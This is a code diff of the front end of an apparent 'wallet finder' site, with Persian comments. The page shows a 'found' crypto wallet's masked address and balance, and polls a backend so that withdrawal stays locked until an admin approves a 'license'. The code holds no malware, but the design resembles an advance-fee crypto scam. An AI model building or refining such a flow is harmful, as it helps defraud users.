@@ -20,20 +20,11 @@
       padding: 30px;
       border-radius: 18px;
       box-shadow: 0 0 30px #0ff4, inset 0 0 20px #0ff3;
-      position: relative;
     }
     h1 {
       text-align: center;
       margin-bottom: 30px;
       font-size: 2em;
-      position: relative;
-    }
-    h1::after {
-      content: "👤";
-      position: absolute;
-      right: -10px;
-      top: -10px;
-      font-size: 1.5em;
     }
     table {
       width: 100%;
@@ -71,71 +62,88 @@
       background: #00faff;
       box-shadow: 0 0 14px #0ff;
     }
-    .info-icon {
-      font-size: 1.2em;
-      margin-right: 6px;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>My Wallet Profile</h1>
     <table>
-      <tr><th><span class="info-icon">🧑‍💻</span>Username</th><td id="username"></td></tr>
-      <tr><th><span class="info-icon">🔐</span>Found Wallet Address</th><td id="walletAddress"></td></tr>
-      <tr><th><span class="info-icon">💰</span>Balance</th><td id="walletBalance"></td></tr>
-      <tr><th><span class="info-icon">🌐</span>Network</th><td id="walletNetwork"></td></tr>
-      <tr><th><span class="info-icon">📜</span>License Status</th><td id="licenseStatus"></td></tr>
-      <tr><th><span class="info-icon">🔎</span>Transaction Hash</th><td id="licenseTx"></td></tr>
+      <tr><th>🧑‍💻 Username</th><td id="username"></td></tr>
+      <tr><th>🔐 Wallet Address</th><td id="walletAddress"></td></tr>
+      <tr><th>💰 Balance</th><td id="walletBalance"></td></tr>
+      <tr><th>🌐 Network</th><td id="walletNetwork"></td></tr>
+      <tr><th>📜 License Status</th><td id="licenseStatus"></td></tr>
+      <tr><th>🔎 Transaction Hash</th><td id="licenseTx"></td></tr>
     </table>
-    <!-- Only one button -->
-    <button id="withdrawBtn" class="btn" disabled onclick="window.location.href='transaction.html'">
+
+    <button id="withdrawBtn" class="btn" disabled>
       💸 Withdraw Assets
     </button>
   </div>
 
   <script>
-    // اطلاعات کاربر و کیف پول
-    const username = localStorage.getItem("username") || "Unknown";
-    const wallet = JSON.parse(localStorage.getItem("found_wallet") || "{}");
-    const license = localStorage.getItem("license_status") || "not submitted";
-    const hash = localStorage.getItem("license_tx") || "N/A";
-    const maskedAddress = wallet.address ? wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4) : "N/A";
+    const API_BASE_URL = "https://dolphinwalletfinderbackend-production.up.railway.app/api";
+    const token = localStorage.getItem("token");
 
-    document.getElementById("username").textContent = username;
-    document.getElementById("walletAddress").textContent = maskedAddress;
-    document.getElementById("walletBalance").textContent = wallet.balance || "N/A";
-    document.getElementById("walletNetwork").textContent = wallet.network || "N/A";
-    document.getElementById("licenseStatus").textContent = license;
-    document.getElementById("licenseTx").textContent = hash;
-
-    // فقط وضعیت لایسنس را چک کن
-    function checkLicenseStatusAndUpdateBtn() {
-      fetch(`https://dolphinwalletfinderbackend-production.up.railway.app/api/license-status/${username}`)
-        .then(res => res.json())
-        .then(data => {
-          const withdrawBtn = document.getElementById("withdrawBtn");
-          if (data.status === "approved") {
-            withdrawBtn.disabled = false;
-            withdrawBtn.innerText = "💸 Withdraw Assets";
-          } else if (data.status === "rejected") {
-            withdrawBtn.disabled = true;
-            withdrawBtn.innerText = "License rejected by admin";
-          } else {
-            withdrawBtn.disabled = true;
-            withdrawBtn.innerText = "Waiting for license approval";
-          }
-        })
-        .catch(() => {
-          const withdrawBtn = document.getElementById("withdrawBtn");
-          withdrawBtn.disabled = true;
-          withdrawBtn.innerText = "Error retrieving license status";
-        });
+    if (!token) {
+      alert("Please log in first.");
+      window.location.href = "login.html";
     }
 
-    // Check license status on page load and every 5 seconds
-    checkLicenseStatusAndUpdateBtn();
-    setInterval(checkLicenseStatusAndUpdateBtn, 5000 );
+    // نمایش اطلاعات کاربر و ولت
+    function loadProfile() {
+      fetch(`${API_BASE_URL}/my-wallet`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("username").textContent = localStorage.getItem("username") || "Unknown";
+        
+        if (data.wallet) {
+          const wallet = data.wallet;
+          const maskedAddress = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
+          document.getElementById("walletAddress").textContent = maskedAddress;
+          document.getElementById("walletBalance").textContent = wallet.balance || "N/A";
+          document.getElementById("walletNetwork").textContent = wallet.network || "N/A";
+        } else {
+          document.getElementById("walletAddress").textContent = "N/A";
+          document.getElementById("walletBalance").textContent = "N/A";
+          document.getElementById("walletNetwork").textContent = "N/A";
+        }
+      });
+    }
+
+    // چک وضعیت لایسنس
+    function checkLicenseStatus() {
+      fetch(`${API_BASE_URL}/license/status`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        const statusCell = document.getElementById("licenseStatus");
+        const withdrawBtn = document.getElementById("withdrawBtn");
+
+        if (data.license === "active") {
+          statusCell.textContent = "✅ Approved";
+          withdrawBtn.disabled = false;
+          withdrawBtn.onclick = () => window.location.href = "transaction.html";
+        } else {
+          statusCell.textContent = "⏳ Waiting for approval";
+          withdrawBtn.disabled = true;
+        }
+      })
+      .catch(() => {
+        document.getElementById("licenseStatus").textContent = "❌ Error checking status";
+        document.getElementById("withdrawBtn").disabled = true;
+      });
+    }
+
+    // اجرای اولیه
+    loadProfile();
+    checkLicenseStatus();
+
+    // چک خودکار هر 5 ثانیه
+    setInterval(checkLicenseStatus, 5000);
   </script>
 </body>
 </html>
